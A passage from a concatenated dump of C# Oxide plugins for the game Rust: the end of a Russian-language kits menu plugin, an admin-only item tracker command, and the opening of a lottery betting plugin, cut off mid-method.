                    Image = { Color = "1 1 1 0" }
                }, "ui.kits" + ".Main" + ".Layer", "ui.kits" + ".Main" + ".Layer" + $"Kit{kit.Name}");

                if (!string.IsNullOrEmpty(kit.CustomImage))
                {
                    container.Add(new CuiElement
                    {
                        Parent = "ui.kits" + ".Main" + ".Layer" + $"Kit{kit.Name}",
                        Components = {
                            new CuiRawImageComponent { Png = (string)ImageLibrary.Call("GetImage", kit.CustomImage) },
                            new CuiRectTransformComponent { AnchorMin = $"0 0", AnchorMax = $"1 1" },
                        }
                    });
                }

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = $"0.043 0.78", AnchorMax = $"0.203 0.96", },
                    Button = { Color = "1 1 1 0", Command = $"kit.drawkitinfo {kit.Name}" },
                    Text = { Text = $"" }
                }, "ui.kits" + ".Main" + ".Layer" + $"Kit{kit.Name}");

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = $"0 1.045", AnchorMax = $"1 1.21" },
                    Text = { Text = $"{kit.DisplayName}", Color = "1 1 1 1",FontSize = 14, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
                }, "ui.kits" + ".Main" + ".Layer" + $"Kit{kit.Name}");

                if (playerData.Cooldown - 1 < GetCurrentTime())
                {
                    container.Add(new CuiElement
                    {
                        Name = "ui.kits" + ".Main" + ".Layer" + $"Kit{kit.Name}" + ".Open",
                        Parent = "ui.kits" + ".Main" + ".Layer" + $"Kit{kit.Name}",
                        Components = {
                            new CuiRawImageComponent { Png = (string)ImageLibrary.Call("GetImage", "canOpen") },
                            new CuiRectTransformComponent { AnchorMin = $"0 -0.225", AnchorMax = $"1 -0.065" },
                        }
                    });

                    container.Add(new CuiLabel
                    {
                        RectTransform = { AnchorMin = $"0 0", AnchorMax = $"1 1" },
                        Text = { Text = $"Открыть", Color = "1 1 1 1",FontSize = 14, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
                    }, "ui.kits" + ".Main" + ".Layer" + $"Kit{kit.Name}" + ".Open");

                    container.Add(new CuiButton
                    {
                        Button = { Color="0.75 0.75 0.75 0", Command= $"kit {kit.Name} {page}" },
                        RectTransform = { AnchorMin="0 0", AnchorMax="1 1" },
                        Text = { Text = "", Font = "robotocondensed-regular.ttf", Align = TextAnchor.MiddleCenter, FontSize = 18 }
                    }, "ui.kits" + ".Main" + ".Layer" + $"Kit{kit.Name}" + ".Open");
                }
                else
                {
                    var time = TimeSpan.FromSeconds(playerData.Cooldown - GetCurrentTime());

                    container.Add(new CuiLabel
                    {
                        RectTransform = { AnchorMin = $"0 -0.225", AnchorMax = $"1 -0.065" },
                        Text = { Text = $"ОСТАЛОСЬ {TimeExtensions.FormatShortTime(time)}", Color = "1 1 1 1",FontSize = 12, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
                    }, "ui.kits" + ".Main" + ".Layer" + $"Kit{kit.Name}");
                }

                i++;
            }

            CuiHelper.DestroyUi(player, "ui.kits" + ".Main" + ".Layer");
            CuiHelper.AddUi(player, container);
        }

        [ConsoleCommand("kitdesc")]
        void DescUI(ConsoleSystem.Arg args) {
            var player = args.Player();
            CuiHelper.DestroyUi(player, "ui.kits" + ".Main" + ".Layer" + ".Description");
            var container = new CuiElementContainer();

            container.Add(new CuiElement
            {
                Name = "ui.kits" + ".Main" + ".Layer" + ".Description",
                Parent = "ui.kits" + ".Main" + ".Layer",
                Components = {
                    new CuiRawImageComponent { Png = (string)ImageLibrary.Call("GetImage", "fonDescription") },
                    new CuiRectTransformComponent { AnchorMin = $"0.58 0.6", AnchorMax = $"0.8 0.8" },
                }
            });

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.05 0.8", AnchorMax = "0.9 1" },
                Text = { Text = $"Описание китов", Color = "1 1 1 0.65",FontSize = 14, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, "ui.kits" + ".Main" + ".Layer" + ".Description");

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.05 0", AnchorMax = "1 0.7" },
                Text = { Text = $"{config.Info}", Color = "1 1 1 0.65",FontSize = 12, Font = "robotocondensed-bold.ttf", Align = TextAnchor.UpperLeft }
            }, "ui.kits" + ".Main" + ".Layer" + ".Description");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.9 0.82", AnchorMax = "0.98 0.98" },
                Button = { Close = "ui.kits" + ".Main" + ".Layer" + ".Description", Color = "1 1 1 0" },
                Text = { Text = "" }
            }, "ui.kits" + ".Main" + ".Layer" + ".Description");

            CuiHelper.AddUi(player, container);
        }

        private string FormatTime(double time)
        {
            TimeSpan dateDifference = TimeSpan.FromSeconds(time);
            var days = dateDifference.Days;
            var hours = dateDifference.Hours;
            hours += (days * 24);
            var mins = dateDifference.Minutes;
            var secs = dateDifference.Seconds;
            if (hours > 0) return string.Format("{0:00}:{1:00}:{2:00}", hours, mins, secs);
            else return string.Format("{0:00}:{1:00}", mins, secs);
        }

        [ConsoleCommand("kit.drawkitinfo")]
        void cmdDrawKitInfo(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            if (player == null || player.Connection == null) return;
            var kit = kitsList.First(kits => kits.Name.ToLower() == args.Args[0].ToLower());
            if (kit == null) return;
            DrawKitInfo(player, kit);
        }

        private void DrawKitInfo(BasePlayer player, Kit kit)
        {
            var container = new CuiElementContainer();

            container.Add(new CuiElement
            {
                Name = "ui.kits" + ".Main" + ".Layer" + ".Description",
                Parent = "ui.kits" + ".Main" + ".Layer",
                Components = {
                    new CuiRawImageComponent { Png = GetImage("fonDescriptionKit") },
                    new CuiRectTransformComponent { AnchorMin = $"0.23 0.07", AnchorMax = $"0.77 0.495" },
                }
            });

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0.01 0.93", AnchorMax = "0.965 0.99" },
                Text = { Text = $"Описание кейса '{kit.DisplayName}'", Color = "1 1 1 1",FontSize = 12, Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleLeft }
            }, "ui.kits" + ".Main" + ".Layer" + ".Description");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.965 0.925", AnchorMax = "0.995 0.99" },
                Button = { Close = "ui.kits" + ".Main" + ".Layer" + ".Description", Color = "1 1 1 0" },
                Text = { Text = "" }
            }, "ui.kits" + ".Main" + ".Layer" + ".Description");

            for (int i = 0, y = 0, x = 0; i < 36; i++)
            {
                container.Add(new CuiElement
                {
                    Name = "ui.kits" + ".Main" + ".Layer" + ".Description" + $"Item{i}",
                    Parent = "ui.kits" + ".Main" + ".Layer" + ".Description",
                    Components = 
                    {
                        new CuiRawImageComponent { Png = (string)ImageLibrary.Call("GetImage", "fonItemsKit") },
                        new CuiRectTransformComponent { AnchorMin = $"{0.04 + (x * 0.103)} {0.69 - (y * 0.22)}", AnchorMax = $"{0.13 + (x * 0.103)} {0.89 - (y * 0.22)}" },
                    }
                });

                if (kit.Items.Count - 1 >= i)
                {
                    var Item = kit.Items[i];

                    container.Add(new CuiElement
                    {
                        Parent = "ui.kits" + ".Main" + ".Layer" + ".Description" + $"Item{i}",
                        Components = 
                        {
                            new CuiRawImageComponent { Png =!string.IsNullOrEmpty(Item.CustomImage) ? GetImage(Item.CustomImage) :  Item.ShortName == "mailbox"? GetImage("mailbox_1812087291") : GetImage(Item.ShortName, Item.SkinID),}, 
                            new CuiRectTransformComponent { AnchorMin="0 0", AnchorMax="1 1", OffsetMin = "6 6", OffsetMax = "-6 -6" },
                        },
                    });

                    container.Add(new CuiElement
                    {
                        Parent = "ui.kits" + ".Main" + ".Layer" + ".Description" + $"Item{i}",
                        Components = 
                        {
                            new CuiTextComponent { Color="0.85 0.85 0.85 1.00", Text=$"{Item.Amount} шт.", FontSize=12, Align=TextAnchor.MiddleCenter, }, 
                            new CuiRectTransformComponent { AnchorMin=$"0 0", AnchorMax=$"1 0.3" }, 
                            new CuiOutlineComponent { Color="0 0 0 0.3", Distance="-0.5 0.5" } 
                        },
                    });
                }
                
                x++;
                if (x == 9)
                {
                    y++;
                    x = 0;
                }
            }

            CuiHelper.DestroyUi(player, "ui.kits" + ".Main" + ".Layer" + ".Description");
            CuiHelper.AddUi(player, container);
        }
        private int? ChangeSelect(int x)
        {
            var num = (from number in config.RaritiesColor.Select(p => p.Chance)
                       let difference = Math.Abs(number - x)
                       orderby difference, Math.Abs(number), number descending
                       select number)
                .FirstOrDefault();
            return num;
        }
        private void SendEffectToPlayer2(BasePlayer player, string effectPrefab)
        {
            EffectNetwork.Send(new Effect(effectPrefab, player.transform.position, Vector3.zero), player.net.connection);
        }
        private KitData GetPlayerData(string name, ulong playerid = 1)
        {
            if (!PlayersData.ContainsKey(playerid)) PlayersData[playerid] = new Dictionary<string, KitData>();
            if (!PlayersData[playerid].ContainsKey(name)) PlayersData[playerid][name] = new KitData();
            return PlayersData[playerid][name];
        }
        private List<KitItem> GetPlayerItems(BasePlayer player)
        {
            List<KitItem> kititems = new List<KitItem>();
            foreach (Item item in player.inventory.containerWear.itemList)
            {
                if (item != null)
                {
                    var iteminfo = ItemToKit(item, "wear");
                    kititems.Add(iteminfo);
                }
            }
            foreach (Item item in player.inventory.containerMain.itemList)
            {
                if (item != null)
                {
                    var iteminfo = ItemToKit(item, "main");
                    kititems.Add(iteminfo);
                }
            }
            foreach (Item item in player.inventory.containerBelt.itemList)
            {
                if (item != null)
                {
                    var iteminfo = ItemToKit(item, "belt");
                    kititems.Add(iteminfo);
                }
            }
            return kititems;
        }
        string GetMsg(string key, BasePlayer player = null) => lang.GetMessage(key, this, player == null ? null : player.UserIDString).Replace("{Prefix}", config.DefaultPrefix);
        private KitItem ItemToKit(Item item, string container)
        {
            KitItem kitem = new KitItem();
            kitem.Amount = item.amount;
            kitem.Container = container;
            kitem.SkinID = item.skin;
            kitem.Blueprint = item.blueprintTarget;
            kitem.ShortName = item.info.shortname;
            kitem.Condition = item.condition;
            kitem.Change = 100;
            kitem.Weapon = null;
            kitem.Content = null;
            if (item.info.category == ItemCategory.Weapon)
            {
                BaseProjectile weapon = item.GetHeldEntity() as BaseProjectile;
                if (weapon != null)
                {
                    kitem.Weapon = new Weapon();
                    kitem.Weapon.ammoType = weapon.primaryMagazine.ammoType.shortname;
                    kitem.Weapon.ammoAmount = weapon.primaryMagazine.contents;
                }
            }
            if (item.contents != null)
            {
                kitem.Content = new List<ItemContent>();
                foreach (var cont in item.contents.itemList)
                {
                    kitem.Content.Add(new ItemContent()
                    {
                        Amount = cont.amount,
                        Condition = cont.condition,
                        ShortName = cont.info.shortname
                    }
                    );
                }
            }
            return kitem;
        }
        private List<Kit> GetKitsForPlayer(BasePlayer player)
        {
            if (AdminSetting.Contains(player))
            {
                return kitsList.ToList();
            }
            else return kitsList.Where(kit => !kit.Hide && (string.IsNullOrEmpty(kit.Permission) || permission.UserHasPermission(player.UserIDString, kit.Permission)) && (kit.Amount == 0 || (kit.Amount > 0 && GetPlayerData(kit.Name, player.userID).Amount < kit.Amount))).ToList();
        }
        private BasePlayer FindPlayer(BasePlayer player, string nameOrID)
        {
            ulong id;
            if (ulong.TryParse(nameOrID, out id) && nameOrID.StartsWith("7656119") && nameOrID.Length == 17)
            {
                var findedPlayer = BasePlayer.FindByID(id);
                if (findedPlayer == null || !findedPlayer.IsConnected)
                {
                    SendReply(player, GetMsg("Not Found Player", player));
                    return null;
                }
                return findedPlayer;
            }
            var foundPlayers = BasePlayer.activePlayerList.Where(x => x.displayName.ToLower().Contains(nameOrID.ToLower()));
            if (foundPlayers.Count() == 0)
            {
                SendReply(player, GetMsg("Not Found Player", player));
                return null;
            }
            if (foundPlayers.Count() > 1)
            {
                SendReply(player, GetMsg("To Many Player", player));
                return null;
            }
            return foundPlayers.First();
        }
        private double GetCurrentTime() => new TimeSpan(DateTime.UtcNow.Ticks).TotalSeconds;
        private static string HexToRustFormat(string hex)
        {
            if (string.IsNullOrEmpty(hex))
            {
                hex = "#FFFFFFFF";
            }
            var str = hex.Trim('#');
            if (str.Length == 6) str += "FF";
            if (str.Length != 8)
            {
                throw new InvalidOperationException("Cannot convert a wrong format.");
            }
            var r = byte.Parse(str.Substring(0, 2), NumberStyles.HexNumber);
            var g = byte.Parse(str.Substring(2, 2), NumberStyles.HexNumber);
            var b = byte.Parse(str.Substring(4, 2), NumberStyles.HexNumber);
            var a = byte.Parse(str.Substring(6, 2), NumberStyles.HexNumber);
            Color color = new Color32(r, g, b, a);
            return string.Format("{0:F2} {1:F2} {2:F2} {3:F2}", color.r, color.g, color.b, color.a);
        }
        private static class TimeExtensions
        {
            public static string FormatShortTime(TimeSpan time)
            {
                string result = string.Empty;
                if (time.Days != 0) result += $"{time.Days} д. ";
                if (time.Hours != 0) result += $"{time.Hours} ч. ";
                if (time.Minutes != 0) result += $"{time.Minutes} м. ";
                if (time.Seconds != 0) result += $"{time.Seconds} с. ";
                return result;
            }
            public static string FormatTime(TimeSpan time)
            {
                string result = string.Empty;
                if (time.Days != 0) result += $"{Format(time.Days, "дней", "дня", "день")} ";
                if (time.Hours != 0) result += $"{Format(time.Hours, "часов", "часа", "час")} ";
                if (time.Minutes != 0) result += $"{Format(time.Minutes, "минут", "минуты", "минута")} ";
                if (time.Seconds != 0) result += $"{Format(time.Seconds, "секунд", "секунды", "секунда")} ";
                return result;
            }
            private static string Format(int units, string form1, string form2, string form3)
            {
                var tmp = units % 10;
                if (units >= 5 && units <= 20 || tmp >= 5 && tmp <= 9) return $"{units} {form1}";
                if (tmp >= 2 && tmp <= 4) return $"{units} {form2}";
                return $"{units} {form3}";
            }
        }
        [HookMethod("isKit")]
        public bool isKit(string kitName)
        {
            if (kitsList.Select(p => p.Name == kitName) != null) return true;
            return false;
        }
        [HookMethod("GetAllKits")] public string[] GetAllKits() => kitsList.Select(p => p.Name).ToArray();
    }
}                                                                                                                      

// --- End of file: TPKits.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/Tracker.cs ---
// --- Original Local Path: Tracker.cs ---

using UnityEngine;
using System;
using System.Reflection;
using System.Collections;
using System.Collections.Generic;
using Oxide.Core;

namespace Oxide.Plugins
{

    [Info("Tracker", "Wolfs Darker", "1.0.1", ResourceId = 1278)]
    class Tracker : RustPlugin
    {
        #region Variables
        /**
         * Invalid name message.
         */
        static String invalid_name = "Invalid Name! Try again!";
        /**
         * Multiple players found message.
         */
        static String multiple_players = "Multiple players found with that name! Try again!";
 
        /**
         * Handles the tracked item data.
         */ 
        public class TrackedItem
        {
            public String container_name;
            public String location;
            public int count;
        }

        #endregion

        #region Item filters

        /**
         * Returns a list of all players that has the item.
         */ 
        List<TrackedItem> findPlayerItems(String item, int min_amount)
        {
            var players = UnityEngine.Object.FindObjectsOfType<BasePlayer>();
            var items_found = new List<TrackedItem>();

            if (players.Length == 0)
            {
                return items_found;
            }

            List<Item> items = new List<Item>();
            TrackedItem t;

            foreach (BasePlayer player in players)
            {
                if (player != null)
                {
                    items.Clear();

                    items.AddRange(player.inventory.containerMain.itemList);
                    items.AddRange(player.inventory.containerBelt.itemList);
                    items.AddRange(player.inventory.containerWear.itemList);
                    t = new TrackedItem();

                    if (items.ToArray().Length > 0)
                    {
                        foreach (Item i in items)
                        {
                            if (i != null && i.info.displayName.english.ToLower().Equals(item.ToLower()))
                            {
                                t.container_name = player.displayName + (player.IsSleeping() ? "(Sleeping)" : "(Online)");
                                t.location = (int)player.transform.position.x + " " + (int)player.transform.position.y + " " + (int)player.transform.position.z;
                                t.count += i.amount;
                            }
                        }
                    }

                    if (t != null && t.count > 0 && t.count >= min_amount)
                    {
                        items_found.Add(t);
                    }
                }
            }

            return items_found;
        }

        /**
         * Returns a list of chests that has the item.
         */ 
        List<TrackedItem> findChestItems(String item, int min_amount)
        {
            var containers = UnityEngine.Object.FindObjectsOfType<StorageContainer>();
            var items_found = new List<TrackedItem>();

            if (containers.Length == 0)
            {
                Puts("There is no containers in game.");
                return items_found;
            }

            TrackedItem t;

            foreach (StorageContainer container in containers)
            {
                if (container != null && container.inventory != null && container.name.Contains("woodbox"))
                {
                    t = new TrackedItem();

                    if (container.inventory.itemList.ToArray().Length > 0)
                    {
                        foreach (Item i in container.inventory.itemList)
                        {
                            if (i != null && i.info.displayName.english.ToLower().Equals(item.ToLower()))
                            {
                                t.container_name = "A Chest";
                                t.location = (int)container.transform.position.x + " " + (int)container.transform.position.y + " " + (int)container.transform.position.z;
                                t.count += i.amount;
                            }
                        }
                    }

                    if (t != null && t.count > 0 && t.count >= min_amount)
                    {
                        items_found.Add(t);
                    }
                }
            }

            return items_found;
        }

        #endregion

        #region Hooks
        /**
         * Displays the total items count in game.
         */
        [ConsoleCommand("trackitemcount")]
        void cmdTrackItemCount(ConsoleSystem.Arg arg)
        {
            if (arg.Player() && !arg.Player().IsAdmin())
            {
                SendReply(arg, "You don't have permission to use this command.");
                return;
            }

            if (arg.Args.Length == 0)
            {
                Puts("Track Count items usage:");
                Puts("/trackitemcount item - Shows the amount of certain item in game.");
                return;
            }

            var item = arg.Args.Length > 0 ? arg.Args[0].ToLower() : "";

            if (!itemExist(item))
            {
                Puts("Looks like there is no such a item named '" + item + "'.");
                return;
            }

            List<TrackedItem> items_list = new List<TrackedItem>();

            items_list.AddRange(findChestItems(item, 0));
            items_list.AddRange(findPlayerItems(item, 0));

            int count = 0;

            foreach (TrackedItem t in items_list)
            {
                if(t != null)
                    count += t.count;
            }

            Puts("There is " + String.Format("{0:N0}", count) + " '" + item + "' in game.");
        }

        /**
         * Displays a list of all containers/players that has certain item.
         */ 
        [ConsoleCommand("trackitem")]
        void consoleTrackItem(ConsoleSystem.Arg arg)
        {

            if (arg.Player() && !arg.Player().IsAdmin())
            {
                SendReply(arg, "You don't have permission to use this command.");
                return;
            }

            if (arg.Args.Length == 0)
            {
                Puts("Track items usage:");
                Puts("/trackitem item optional:place optional:minamount");
                Puts("Places: chests / players / all ( Default: all )");
                return;
            }

            var item = arg.Args.Length > 0 ? arg.Args[0].ToLower() : "";
            var location = arg.Args.Length > 1 ? arg.Args[1].ToLower() : "all";
            int min_amount = 0;
            try
            {
                min_amount = arg.Args.Length > 2 ? int.Parse(arg.Args[2]) : 0;
            }
            catch (Exception e)
            {
                Puts("Invalind minimun amount! Try again!");
                return;
            }

            if (item.Length == 0 || location.Length == 0 || min_amount < 0 || (!location.Equals("all") && !location.Equals("players") && !location.Equals("chests")))
            {
                Puts("Wrong syntax! Try again!");
                return;
            }

            if (!itemExist(item))
            {
                Puts("Looks like there is no such a item named '" + item + "'.");
                return;
            }

            List<TrackedItem> items_list = new List<TrackedItem>();

            if (location.Equals("all"))
            {
                items_list.AddRange(findChestItems(item, min_amount));
                items_list.AddRange(findPlayerItems(item, min_amount));
            }
            else if (location.Equals("chests"))
                items_list.AddRange(findChestItems(item, min_amount));
            else
                items_list.AddRange(findPlayerItems(item, min_amount));

            if (items_list.ToArray().Length == 0)
            {
                Puts("There is no such item in game(No player or chest has it).");
                return;
            }

            TrackedItem t;

            Puts("'" + item + "'s found:");

            for (int i = 0; i < items_list.Count; i++)
            {
                t = items_list[i];
                if (t != null)
                {
                    Puts(t.container_name + " has " + String.Format("{0:N0}", t.count) + " at position: " + t.location);
                }
            }
        }

        #endregion

        #region Support methods

        /**
         * Checks if the item exist.
         */ 
        bool itemExist(String item)
        {
            foreach (ItemDefinition i in ItemManager.GetItemDefinitions())
            {
                if (i != null && i.displayName.english.ToLower().Equals(item))
                {
                    return true;
                }
            }
            return false;
        }

        #endregion

    }
}

// --- End of file: Tracker.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/Lottery.cs ---
// --- Original Local Path: Lottery.cs ---

using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using Oxide.Core;
using Oxide.Core.Configuration;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;

using UnityEngine;

namespace Oxide.Plugins
{
    [Info("Lottery", "Sami37", "1.0.3", ResourceId = 2145)]
    internal class Lottery : RustPlugin
    {
        #region Economy Support

        [PluginReference("Economics")]
        Plugin Economy;

        #endregion


        #region serverreward

        [PluginReference("ServerRewards")]
        Plugin ServerRewards;


        #endregion
        internal class playerinfo
        {
            public int multiplicator { get; set; } = 1;
            public double currentbet { get; set; }
            public double totalbet { get; set; }

        }

        int[] GetIntArray(int num)
        {
            List<int> listOfInts = new List<int>();
            while(num > 0)
            {
                listOfInts.Add(num % 10);
                num = num / 10;
            }
            listOfInts.Reverse();
            return listOfInts.ToArray();
        }

        #region general_variable
        private bool newConfig, UseSR;
        public Dictionary<ulong, playerinfo> Currentbet = new Dictionary<ulong, playerinfo>();
        private string container, containerwin;
        private DynamicConfigFile data;
        private double jackpot, SRMinBet, SRjackpot, MinBetjackpot;
        private int JackpotNumber, SRJackpotNumber, DefaultMaxRange, DefaultMinRange;
        public Dictionary<string, int> IndividualRates { get; private set; }
        public Dictionary<string, int> SRRates { get; private set; }
        private Dictionary<string, object> DefaultWinRates = null;
        private Dictionary<string, int> SRWinRates = null;
        private List<string> DefaultBasePoint = null;
        #endregion

        #region config
		object GetConfig(string menu, string datavalue, object defaultValue)
		{
			var data = Config[menu] as Dictionary<string, object>;
			if (data == null)
			{
				data = new Dictionary<string, object>();
				Config[menu] = data;
				newConfig = true;
			}
			object value;
			if (!data.TryGetValue(datavalue, out value))
			{
				value = defaultValue;
				data[datavalue] = value;
				newConfig = true;
			}
			return value;
		}
		protected override void LoadDefaultConfig()
		{
			Config.Clear();
			LoadConfig();
		}

        void LoadConfig()
        {
            jackpot = Convert.ToDouble(GetConfig("Global", "Jackpot", 50000));
            DefaultWinRates = (Dictionary<string, object>)GetConfig("Global", "WinRate", DefaultPay());
            DefaultBasePoint = GetConfig("ServerRewards", "Match", DefaultSRPay()) as List<string>;
            SRWinRates = GetConfig("ServerRewards", "WinPoint", DefautSRWinPay()) as Dictionary<string,int>;
            SRjackpot = Convert.ToDouble(GetConfig("ServerRewards", "Jackpot", 10));
            SRMinBet = Convert.ToDouble(GetConfig("ServerRewards", "MinBet", 1000));
            MinBetjackpot = Convert.ToDouble(GetConfig("ServerRewards", "MinBetJackpot", 100000));
            SRJackpotNumber = Convert.ToInt32(GetConfig("ServerRewards", "JackpotMatch", 1869));
            JackpotNumber = Convert.ToInt32(GetConfig("Global", "JackpotMatch", 1058));
            DefaultMinRange = Convert.ToInt32(GetConfig("Global", "RollMinRange", 1000));
            DefaultMaxRange = Convert.ToInt32(GetConfig("Global", "RollMaxRange", 9999));
            UseSR = Convert.ToBoolean(GetConfig("ServerRewards", "Enabled", false));
		    if (!newConfig) return;
		    SaveConfig();
		    newConfig = false;
        }
        static Dictionary<string, object> DefaultPay()
        {
            var d = new Dictionary<string, object>
            {
                { "111x", 1 },
                { "222x", 10 },
                { "333x", 50 },
                { "444x", 10 },
                { "555x", 75 },
                { "666x", 5 },
                { "777x", 75 },
                { "888x", 56 },
                { "999x", 42 },
                { "99x9", 52 },
                { "9x99", 57 },
                { "x999", 85 },
                { "99xx", 86 },
                { "9xxx", 86 }
            };
            return d;
        }

        static List<string> DefaultSRPay()
        {
            var d = new List<string>
            {
                "111x",
                "222x",
                "333x",
                "444x",
                "555x",
                "666x",
                "777x",
                "888x",
                "999x",
                "99x9",
                "9x99",
                "x999",
                "99xx",
                "9xxx"
            };
            return d;
        }

        static Dictionary<string, int> DefautSRWinPay()
        {
            var d = new Dictionary<string, int>
            {
                { "Match1Number", 1 },
                { "Match2Number", 2 },
                { "Match3Number", 3 },
                { "Match4Number", 4 }
            };
            return d;
        }

        #endregion

        #region data_init

        void LoadDefaultMessages()
        {
            var messages = new Dictionary<string, string>
            {
                {"NoPerm", "You don't have permission to do it."},
                {"NoWin", "You roll {0} but don't win anything."},
                {"NoEconomy", "Economics isn't installed."},
                {"NotEnoughMoney", "You don't have enough money."},
                {"Win", "You roll {0} and won {1}$"},
                {"WinPoints", "You roll {0} and won {1} point(s)"},
                {"NoBet", "You must bet before."},
                {"Balance", "Your current balance is {0}$"},
                {"CurrentBet", "Your current bet is {0}$"},
                {"Roll", "Roll {0} to win \nthe current jackpot:\n {1}$"},
                {"Jackpot", "You roll {0} and won the jackpot : {1}$ !!!!!!"},
                {"MiniSRBet", "You need to bet more to place bet. (Min: {0})"},
                {"BetMore", "If you had bet more you could win the jackpot. (Min: {0})"},
                {"MinimumSRBet", "Minimum bet of {0} to win the current jackpot: {1} point(s)"}
            };
            lang.RegisterMessages(messages, this);
            Puts("Messages loaded...");
        }

		void OnServerInitialized() {
            LoadConfig();
			LoadDefaultMessages();
            permission.RegisterPermission("Lottery.canuse", this);
		    if (DefaultWinRates != null)
		    {
		        IndividualRates = new Dictionary<string, int>();
		        foreach (var entry in DefaultWinRates)
		        {
		            int rate;
		            if (!int.TryParse(entry.Value.ToString(), out rate)) continue;
		            IndividualRates.Add(entry.Key, rate);
		        }

                var ServerRewardsDict = SRWinRates;
                SRRates = new Dictionary<string, int>();
		        if (ServerRewardsDict != null)
		        {
                    foreach (var entry in ServerRewardsDict)
                    {
                        int rate;
                        if (!int.TryParse(entry.Value.ToString(), out rate)) continue;
                        SRRates.Add(entry.Key, rate);
                    }
		        }

                data = Interface.Oxide.DataFileSystem.GetFile(Name);
                try
                {
                    Currentbet = data.ReadObject<Dictionary<ulong, playerinfo>>();
                }
                catch (Exception e)
                {
                    Currentbet = new Dictionary<ulong, playerinfo>();
                    Puts(e.Message);
                }
                data.WriteObject(Currentbet);
		    }
		}

        void Unload()
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                GUIDestroy(player);
                GUIDestroy(player);
            }
            Puts("Data saved.");
            if(Currentbet != null)
            SaveData(Currentbet);
        }
        #endregion
        
        #region save_data
        void SaveData(Dictionary<ulong, playerinfo> datas)
        {
            data.WriteObject(datas);
        }
        #endregion

        #region Lotery
        void GUIDestroy(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, "container");
            CuiHelper.DestroyUi(player, "containerwin");
            CuiHelper.DestroyUi(player, "ButtonBack");
            CuiHelper.DestroyUi(player, "ButtonForward");
        }
        
        void ShowLotery(BasePlayer player, string[] args)
        {
            if (!Economy.IsLoaded)
            {
                SendReply(player, lang.GetMessage("NoEconomy", this, player.UserIDString));
                return;
            }
            int multiplier = 1;
            int bet = 0;
            int from = 0;
            double currentBalance = (double)Economy?.Call("GetPlayerMoney", player.userID.ToString());
            playerinfo playerbet = new playerinfo();
            if (Currentbet.ContainsKey(player.userID))
            {
                Currentbet.TryGetValue(player.userID, out playerbet);
            }
            else
            {
                Currentbet.Add(player.userID, new playerinfo());
                Currentbet.TryGetValue(player.userID, out playerbet);
            }
            if (args != null && args.Length > 0)
            {
                if (args[0].Contains("less") || args[0].Contains("plus"))
                {
                    if (args[0].Contains("plus"))
                    {
                        if (currentBalance >= playerbet.currentbet*(playerbet.multiplicator + 1))
                        {
                            int.TryParse(args[1], out multiplier);
                            playerbet.multiplicator += multiplier;                            
                        }
                    }
                    if (args[0].Contains("less"))
                    {
                        if (playerbet.multiplicator > 1)
                            playerbet.multiplicator -= 1;
                    }
                }
                if (args[0].Contains("bet"))
                {
                    int.TryParse(args[1], out bet);
                    if(currentBalance < (playerbet.currentbet+bet)*playerbet.multiplicator)
                        SendReply(player, lang.GetMessage("NotEnoughMoney", this, player.UserIDString));
                    else
                        playerbet.currentbet += bet;
                }
                if (args[0].Contains("page"))
                {
                    int.TryParse(args[1], out from);
                }
            }
            int i = 0;
            double jackpots = Math.Round(Currentbet.Sum(v => v.Value.totalbet));
            jackpots += jackpot;
            var win = new CuiElementContainer();
            var containerwin = win.Add(new CuiPanel
            {
                Image =
                {
                    Color = "0.1 0.1 0.1 1"
                },
                RectTransform =
                {
                    AnchorMin = "0.8 0.2",
                    AnchorMax = "1 0.8"
                },
                CursorEnabled = true
            }, "Hud", "containerwin");
            win.Add(new CuiLabel
            {
                Text =
                {
                    Text = "Win Rate",
                    FontSize = 18,
                    Align = TextAnchor.MiddleCenter
                },
                RectTransform =
                {
                    AnchorMin = "0.1 0.85",
                    AnchorMax = "0.9 1"
                }
            }, containerwin);
            if (UseSR && ServerRewards.IsLoaded)
            {
                foreach (var elem in SRRates)
                {
                    var pos = 0.86 - (i - from)/10.0;
                    var pos2 = 0.91 - (i - from)/20.0;
                    win.Add(new CuiLabel
                    {
                        Text =
                        {
                            Text = elem.Key + ": " + elem.Value + " point(s)",
                            FontSize = 18,
                            Align = TextAnchor.MiddleCenter
                        },
                        RectTransform =
                        {
                            AnchorMin = $"{0.1} {pos}",
                            AnchorMax = $"{0.9} {pos2}"
                        }
                    }, containerwin);
                    i++;
                }
            }
            else
            {
                foreach (var elem in IndividualRates)
                {
                    if (i == 0)
                    {
                        var pos = 0.81 - (i - from)/10.0;
                        var pos2 = 0.86 - (i - from)/20.0;
                        win.Add(new CuiLabel
                        {
                            Text =
                            {
                                Text = elem.Key + ": " + elem.Value + " %",
                                FontSize = 18,
                                Align = TextAnchor.MiddleCenter
                            },
                            RectTransform =
                            {
                                AnchorMin = $"{0.1} {pos}",
                                AnchorMax = $"{0.9} {pos2}"
                            }
                        }, containerwin);
                    }
                    else if (i >= from && i < from + 9)
                    {
                        var pos = 0.81 - (i - from)/10.0;
                        var pos2 = 0.86 - (i - from)/20.0;
                        win.Add(new CuiLabel
                        {
                            Text =
                            {
                                Text = elem.Key + ": " + elem.Value + " %",
                                FontSize = 18,
                                Align = TextAnchor.MiddleCenter
                            },
                            RectTransform =
                            {
                                AnchorMin = $"{0.1} {pos}",
                                AnchorMax = $"{0.9} {pos2}"
                            }
                        }, containerwin);
                    }
                    i++;
                }
                var minfrom = from <= 10 ? 0 : from - 10;
                var maxfrom = from + 10 >= i ? from : from + 10;
